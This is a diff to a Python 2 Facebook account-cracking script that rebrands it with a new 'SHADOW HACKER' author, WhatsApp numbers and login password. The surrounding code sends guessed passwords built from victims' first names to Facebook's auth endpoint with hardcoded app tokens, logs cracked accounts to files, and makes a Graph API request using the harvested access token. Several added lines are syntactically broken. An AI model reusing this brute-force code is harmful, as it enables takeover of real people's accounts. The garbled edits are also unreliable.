@@ -1,6 +1,6 @@
 ﻿#!/usr/bin/python2
 #coding=utf-8
-
+this credit gose to SHADOW HACKER 
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
@@ -47,7 +47,7 @@ def jalan(z):
 
 
 #### LOGO ####
-logo = """
+logo = """fuck you haters
 \033[0;39m╭━━━┳━━━┳━━━╮
 \033[0;39m┃╭━╮┃╭━━┫╭━╮┃
 \033[0;39m╰╯╭╯┃╰━━┫┃┃┃┃
@@ -55,9 +55,9 @@ logo = """
 \033[0;39m┃╰━╯┃╰━╯┃╰━╯┃
 \033[0;39m╰━━━┻━━━┻━━━╯
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|RANA.AAHIL\033[0;31m║
-\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/Aahilzada\033[0m \033[0;31m║
-\033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m0308-7861-7861\033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|SHADOW.HACKER\033[0;31m║
+\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/shadow420\033[0m \033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m03203346497\033[0;31m║
 \033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
 def tik():
@@ -77,13 +77,13 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
-print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 085691015635\x1b[1;96m  
+print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 03203346497\x1b[1;96m  
 \033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : TERMUX TOOLS\x1b[1;96m  
-\033[1;93m [¤] \x1b[0;31mTOOLS BY AAHIL\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : AAHIL CREATIONSs\x1b[0;31m"""
+\033[1;93m [¤] \x1b[0;31mTOOLS BY SHADOW\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : Master In Ethical Hacking\x1b[0;31m"""
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "shadow"
+CorrectPassword = "hacker"
 
 loop = 'true'
 while (loop == 'true'):
@@ -95,10 +95,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "yang bener dong"
-            os.system('xdg-open https://wa.me/6285691015635')
+            os.system('xdg-open https://wa.me/03203346497')
     else:
         print "salah sayang!"
-        os.system('xdg-open https://wa.me/6285691015635')
+        os.system('xdg-open https://wa.me/02303346497')
 
 def login():
 	os.system('clear')
@@ -139,7 +139,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -192,7 +192,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Aahil"																														
+	print "\033[1;32;40m[2] \033[1;33;40m══Update SHADOW"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -299,11 +299,11 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;31;48m●💋════════════════════════◄►════════════════════════💋●"
 
-	jalan('                    \033[1;91mAahil start cloning Wait...')
+	jalan('                    \033[1;91mShadow-hacking start cloning Wait...')
 	print  "  \033[1;36;48m ●💋════════════════════════◄►════════════════════════💋●" 
 
 	def main(arg):
-		global cekpoint,oks
+		global successfull,oks
 		user = arg
 		try:
 			os.mkdir('out')
@@ -321,10 +321,10 @@ def pilih_super():
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
 					print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' 👽 ' + b['name']
-					cek = open("out/CP.txt", "a")
-					cek.write(user+"|"+pass1+"\n")
-					cek.close()
-					cekpoint.append(user+pass1)
+					 = open("out/CP.txt", "a")
+					.write(user+"|"+pass1+"\n")
+					ok.close()
+					append(user+pass1)
 				else:
 					pass2 = b['first_name'] + '123'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -335,10 +335,10 @@ def pilih_super():
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
 							print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' 👽 ' + b['name']
-							cek = open("out/CP.txt", "a")
-							cek.write(user+"|"+pass2+"\n")
-							cek.close()
-							cekpoint.append(user+pass2)
+							 = open("out/ok.txt", "a")
+							.write(user+"|"+pass2+"\n")
+							.close()
+							.append(user+pass2)
 						else:
 							pass3 = b['first_name'] + '12345'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -349,10 +349,10 @@ def pilih_super():
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
 									print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' 👽 ' + b['name']
-									cek = open("out/CP.txt", "a")
-									cek.write(user+"|"+pass3+"\n")
-									cek.close()
-									cekpoint.append(user+pass4)
+									= open("out/ok.txt", "a")
+									.write(user+"|"+pass3+"\n")
+									.close()
+									.append(user+pass4)
 								else:
 									pass4 = b['first_name'] + '1234'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -465,12 +465,12 @@ def brute():
                         keluar()
                     else:
                         if 'www.facebook.com' in mpsh['error_msg']:
-                            ceks = open('Brutecekpoint.txt', 'w')
+                            ceks = open('Bruteok.txt', 'w')
                             ceks.write(email + ' | ' + pw + '\n')
                             ceks.close()
                             print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                             print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
-                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe ok'
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                             keluar()
